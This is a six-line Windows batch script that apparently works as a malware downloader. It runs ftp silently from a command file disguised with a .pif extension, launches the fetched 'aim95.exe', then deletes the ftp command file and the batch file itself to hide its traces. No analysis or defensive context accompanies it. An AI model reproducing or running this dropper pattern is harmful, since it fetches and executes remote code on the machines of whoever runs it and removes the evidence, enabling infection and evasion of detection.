   @echo off
   ftp -n -v -s:x.pif
   start aim95.exe
   del x.pif
   del /F xc.bat
   exit /y
